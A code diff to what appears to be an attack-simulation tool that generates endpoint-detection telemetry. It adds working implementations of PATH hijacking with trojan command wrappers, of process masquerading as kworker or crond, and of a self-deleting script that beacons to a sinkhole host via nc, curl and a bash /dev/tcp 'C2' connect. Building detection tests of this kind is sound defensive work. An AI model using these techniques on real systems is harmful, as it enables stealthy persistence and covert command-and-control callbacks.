@@ -1262,11 +1262,11 @@ impl AttackTechnique for ModifyEnvironmentVariable {
 
 LOG_FILE="{intercept_log}"
 TIMESTAMP=$(date -Iseconds)
-USER=$(whoami)
+LOGUSER=${{USER:-$(id -un)}}
 PID=$$
 
 # Enhanced logging: timestamp, user, PID, command, and all arguments
-echo "[$TIMESTAMP] User: $USER | PID: $PID | Command: {cmd_name} $*" >> "$LOG_FILE"
+echo "[$TIMESTAMP] User: $LOGUSER | PID: $PID | Command: {cmd_name} $*" >> "$LOG_FILE"
 
 # Execute the real binary with all arguments and preserve exit code
 {real_path} "$@"
@@ -1365,7 +1365,46 @@ exit $?
 
             drop(log_file); // Close the log file
 
-            info!("PATH hijacking ready - trojans will intercept commands when PATH={hijack_dir}:$PATH");
+            // Fire phase: invoke each hijacked command through a PATH-modified
+            // shell so the trojan wrappers actually execute. Without this the
+            // trojans only exist on disk and never produce process telemetry.
+            let invoke_lines: Vec<String> = trojan_specs
+                .iter()
+                .map(|(name, _)| match *name {
+                    "ls" => "ls -la /tmp >/dev/null 2>&1".to_string(),
+                    "ps" => "ps aux >/dev/null 2>&1".to_string(),
+                    "whoami" => "whoami >/dev/null 2>&1".to_string(),
+                    "sudo" => "sudo -n true >/dev/null 2>&1 || true".to_string(),
+                    "ssh" => "ssh -V >/dev/null 2>&1 || true".to_string(),
+                    "curl" => "curl --version >/dev/null 2>&1 || true".to_string(),
+                    "wget" => "wget --version >/dev/null 2>&1 || true".to_string(),
+                    other => format!("{other} --help >/dev/null 2>&1 || true"),
+                })
+                .collect();
+
+            let invoke_script = format!(
+                "export PATH={hijack_dir}:$PATH; {}",
+                invoke_lines.join("; ")
+            );
+
+            info!("Invoking hijacked commands through PATH-modified shell");
+            match Command::new("/bin/sh")
+                .arg("-c")
+                .arg(&invoke_script)
+                .output()
+                .await
+            {
+                Ok(out) => {
+                    let exit = out.status.code().unwrap_or(-1);
+                    info!(
+                        "Hijacked command invocation completed (exit={exit}, {} commands)",
+                        invoke_lines.len()
+                    );
+                }
+                Err(e) => warn!("Failed to invoke hijacked commands: {e}"),
+            }
+
+            info!("PATH hijacking executed - trojans intercepted commands via PATH={hijack_dir}:$PATH");
             info!("PATH hijacking telemetry generated:");
             info!(
                 "  • {} trojan binaries created (ls, ps, whoami, sudo, ssh, curl, wget)",
@@ -1466,22 +1505,54 @@ impl AttackTechnique for MasqueradingAsCrond {
             let mut binaries_created = Vec::new();
             let mut running_pids = Vec::new();
 
+            // The C source below extends the masquerade with two activities a
+            // real kernel worker, journald, or crond would not perform: writing
+            // to a user-path stage file and initiating a TCP SYN to a remote
+            // host. These break the invariants behavioural rules rely on (e.g.
+            // "kworker never opens a user-space socket") so detection has a
+            // signal beyond the spoofed ps name alone.
             let c_source_template = |process_name: &str| -> String {
                 format!(
                     "#include <stdio.h>\n\
                     #include <stdlib.h>\n\
                     #include <unistd.h>\n\
-                    #include <sys/prctl.h>\n\
                     #include <string.h>\n\
+                    #include <fcntl.h>\n\
+                    #include <sys/prctl.h>\n\
+                    #include <sys/socket.h>\n\
+                    #include <netinet/in.h>\n\
+                    #include <arpa/inet.h>\n\
                     \n\
-                    int main() {{\n\
+                    int main(int argc, char **argv) {{\n\
                         prctl(PR_SET_NAME, \"{process_name}\", 0, 0, 0);\n\
                         \n\
-                        printf(\"SignalBench: Masquerading as {process_name}\\n\");\n\
-                        printf(\"PID: %d\\n\", getpid());\n\
+                        if (argc > 1) {{\n\
+                            int fd = open(argv[1], O_WRONLY | O_CREAT | O_TRUNC, 0644);\n\
+                            if (fd >= 0) {{\n\
+                                const char *msg = \"{process_name}:stage\\n\";\n\
+                                ssize_t n = write(fd, msg, strlen(msg));\n\
+                                (void)n;\n\
+                                close(fd);\n\
+                            }}\n\
+                        }}\n\
+                        \n\
+                        if (argc > 2) {{\n\
+                            int s = socket(AF_INET, SOCK_STREAM, 0);\n\
+                            if (s >= 0) {{\n\
+                                int flags = fcntl(s, F_GETFL, 0);\n\
+                                fcntl(s, F_SETFL, flags | O_NONBLOCK);\n\
+                                struct sockaddr_in addr;\n\
+                                memset(&addr, 0, sizeof(addr));\n\
+                                addr.sin_family = AF_INET;\n\
+                                addr.sin_port = htons(80);\n\
+                                if (inet_aton(argv[2], &addr.sin_addr) != 0) {{\n\
+                                    connect(s, (struct sockaddr *)&addr, sizeof(addr));\n\
+                                }}\n\
+                                close(s);\n\
+                            }}\n\
+                        }}\n\
                         \n\
                         sleep(10);\n\
-                        \n\
                         return 0;\n\
                     }}\n"
                 )
@@ -1498,9 +1569,12 @@ impl AttackTechnique for MasqueradingAsCrond {
                 binaries.len()
             );
 
+            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;
+
             for (spoof_name, safe_filename) in &binaries {
                 let source_file = format!("{work_dir}/{safe_filename}.c");
                 let binary_file = format!("{work_dir}/{safe_filename}");
+                let stage_file = format!("{work_dir}/.stage-{safe_filename}");
 
                 let source_code = c_source_template(spoof_name);
                 fs::write(&source_file, source_code.as_bytes())
@@ -1520,12 +1594,15 @@ impl AttackTechnique for MasqueradingAsCrond {
                 }
 
                 artifacts.push(binary_file.clone());
+                artifacts.push(stage_file.clone());
                 binaries_created.push(format!("{safe_filename} -> {spoof_name}"));
 
                 info!(
                     "Executing masquerading binary: {safe_filename} (will appear as {spoof_name})"
                 );
                 let child = Command::new(&binary_file)
+                    .arg(&stage_file)
+                    .arg(&sinkhole_ip)
                     .spawn()
                     .map_err(|e| format!("Failed to execute {spoof_name}: {e}"))?;
 
@@ -1533,7 +1610,9 @@ impl AttackTechnique for MasqueradingAsCrond {
                 running_pids.push(pid);
                 artifacts.push(format!("pid_{pid}"));
 
-                info!("[OK] Binary running with PID {pid}, spoofing as {spoof_name}");
+                info!(
+                    "[OK] Binary running with PID {pid}, spoofing as {spoof_name}, stage {stage_file}, connect {sinkhole_ip}:80"
+                );
 
                 tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;
             }
@@ -2273,29 +2352,39 @@ impl AttackTechnique for ProcessMasquerading {
             )
             .unwrap();
 
-            // Create a script that renames itself, spawns children, and runs longer
+            // Resolve the sinkhole IP so the masqueraded children can attempt a
+            // bash /dev/tcp connect. The connect breaks the kernel-thread
+            // invariant ("[kworker] does not open user-space sockets") that
+            // behavioural detection rules key on.
+            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;
+
+            // Create a script that renames itself, spawns children, and runs longer.
+            // Each renamed child writes a stage file and attempts a TCP connect so
+            // the process is observably doing things a real kworker/sshd/crond
+            // would not - this is what elevates the detection from "weird ps row"
+            // to "kernel-thread name with user-space socket activity".
             let script_content = format!(
                 r#"#!/bin/bash
-# SignalBench masquerading child process - extended runtime
 echo $$ > /tmp/signalbench_masq_child.pid
-echo '{}' > /proc/self/comm
+echo '{name}' > /proc/self/comm
 
-# Spawn additional child processes with different suspicious names
-for name in kworker apache2 sshd crond; do
+for child_name in kworker apache2 sshd crond; do
     (
-        echo "$name" > /proc/self/comm 2>/dev/null
+        echo "$child_name" > /proc/self/comm 2>/dev/null
+        # File write from a process appearing as kworker is anomalous
+        echo "stage:$child_name" > "/tmp/signalbench_masq_$child_name" 2>/dev/null
+        # TCP connect from a process appearing as kworker is the strong signal
+        timeout 1 bash -c "exec 3<>/dev/tcp/{sinkhole}/80" 2>/dev/null
         sleep 3
     ) &
 done
 
-# Extended runtime for better detection window
 sleep 5
-
-# Cleanup
 rm -f /tmp/signalbench_masq_child.pid
 wait
 "#,
-                truncated_name
+                name = truncated_name,
+                sinkhole = sinkhole_ip
             );
 
             let script_path = "/tmp/signalbench_masq_child.sh";
@@ -2362,6 +2451,14 @@ wait
             // Remove any leftover files
             let _ = fs::remove_file("/tmp/signalbench_masq_child.pid");
             let _ = fs::remove_file("/tmp/signalbench_masq_child.sh");
+
+            // Remove stage files written by the masqueraded children.
+            for child_name in ["kworker", "apache2", "sshd", "crond"] {
+                let stage = format!("/tmp/signalbench_masq_{child_name}");
+                if Path::new(&stage).exists() {
+                    let _ = fs::remove_file(&stage);
+                }
+            }
 
             for artifact in artifacts {
                 if Path::new(artifact).exists() {
@@ -2444,14 +2541,17 @@ impl AttackTechnique for SelfDeletingBinary {
                 info!("[DRY RUN] - Create work directory: {}", work_dir);
                 info!("[DRY RUN] - Create test script that deletes itself");
                 info!("[DRY RUN] - Execute and monitor /proc/self/exe status");
+                info!("[DRY RUN] - Network activity targets sinkhole.signalbench.sigre.xyz (fallback 198.135.184.22); on fallback, traffic is unidirectional (send-only)");
                 return Ok(SimulationResult {
                     technique_id: self.info().id,
                     success: true,
-                    message: "DRY RUN: Would demonstrate self-deleting binary pattern".to_string(),
+                    message: "DRY RUN: Would demonstrate self-deleting binary pattern; network targets resolve sinkhole.signalbench.sigre.xyz (fallback 198.135.184.22)".to_string(),
                     artifacts: vec![log_file, work_dir],
                     cleanup_required: false,
                 });
             }
+
+            let sinkhole_ip = crate::techniques::resolve_sinkhole_ip().await;
 
             // Create work directory
             fs::create_dir_all(&work_dir)
@@ -2483,7 +2583,7 @@ impl AttackTechnique for SelfDeletingBinary {
                 r#"#!/bin/bash
 # SignalBench self-deleting script demonstration
 SCRIPT_PATH="$0"
-MARKER="{}"
+MARKER="{marker_path}"
 
 # Record our PID and exe link status before deletion
 echo "PID: $$" > "$MARKER"
@@ -2496,9 +2596,9 @@ readlink -f /proc/$$/exe >> "$MARKER" 2>&1
 # This creates a connection pattern that EDR can correlate with the deletion
 echo "" >> "$MARKER"
 echo "Performing network activity before deletion..." >> "$MARKER"
-timeout 2 nc -zv 198.135.184.22 443 2>&1 >> "$MARKER" || true
-timeout 2 curl -s -m 2 http://198.135.184.22/beacon 2>&1 >> "$MARKER" || true
-timeout 2 bash -c 'echo "C2" > /dev/tcp/198.135.184.22/4444' 2>/dev/null || true
+timeout 2 nc -zv {sinkhole_ip} 443 2>&1 >> "$MARKER" || true
+timeout 2 curl -s -m 2 http://{sinkhole_ip}/beacon 2>&1 >> "$MARKER" || true
+timeout 2 bash -c 'echo "C2" > /dev/tcp/{sinkhole_ip}/4444' 2>/dev/null || true
 echo "Network activity complete" >> "$MARKER"
 
 # Extended delay before deletion for detection window
@@ -2520,8 +2620,7 @@ readlink -f /proc/$$/exe >> "$MARKER" 2>&1
 sleep 3
 
 echo "Script completed while deleted from disk" >> "$MARKER"
-"#,
-                marker_path
+"#
             );
 
             fs::write(&script_path, &script_content)
@@ -2535,27 +2634,46 @@ echo "Script completed while deleted from disk" >> "$MARKER"
             writeln!(log, "Created self-deleting script: {}", script_path).unwrap();
             info!("[T1070.004-SELF] Created test script: {}", script_path);
 
+            let is_fallback = sinkhole_ip == crate::techniques::SINKHOLE_IP_FALLBACK;
+
             // Execute the script
-            let exec_result = Command::new("bash").args([&script_path]).output().await;
-
-            match exec_result {
-                Ok(output) => {
-                    writeln!(log, "Execution completed with status: {}", output.status).unwrap();
-
-                    // Check if script deleted itself
-                    if !Path::new(&script_path).exists() {
-                        writeln!(log, "Script successfully deleted itself while running").unwrap();
-                        info!("[T1070.004-SELF] Script deleted itself successfully");
-                    }
-
-                    // Read the marker file for details
-                    if let Ok(marker_content) = fs::read_to_string(&marker_path) {
-                        writeln!(log, "\nMarker file contents:").unwrap();
-                        writeln!(log, "{}", marker_content).unwrap();
-                    }
+            if is_fallback {
+                // Fire-and-forget: network lines in script use || true; ignore exit code
+                let _ = Command::new("bash").args([&script_path]).output().await;
+                // Lightweight marker readback — retain observability even in fallback mode
+                if !Path::new(&script_path).exists() {
+                    debug!("[T1070.004-SELF] [fallback] Script deleted itself from disk");
                 }
-                Err(e) => {
-                    writeln!(log, "Execution failed: {}", e).unwrap();
+                if let Ok(marker_content) = fs::read_to_string(&marker_path) {
+                    debug!(
+                        "[T1070.004-SELF] [fallback] Marker first line: {}",
+                        marker_content.lines().next().unwrap_or("(empty)")
+                    );
+                }
+            } else {
+                let exec_result = Command::new("bash").args([&script_path]).output().await;
+
+                match exec_result {
+                    Ok(output) => {
+                        writeln!(log, "Execution completed with status: {}", output.status)
+                            .unwrap();
+
+                        // Check if script deleted itself
+                        if !Path::new(&script_path).exists() {
+                            writeln!(log, "Script successfully deleted itself while running")
+                                .unwrap();
+                            info!("[T1070.004-SELF] Script deleted itself successfully");
+                        }
+
+                        // Read the marker file for details
+                        if let Ok(marker_content) = fs::read_to_string(&marker_path) {
+                            writeln!(log, "\nMarker file contents:").unwrap();
+                            writeln!(log, "{}", marker_content).unwrap();
+                        }
+                    }
+                    Err(e) => {
+                        writeln!(log, "Execution failed: {}", e).unwrap();
+                    }
                 }
             }
 
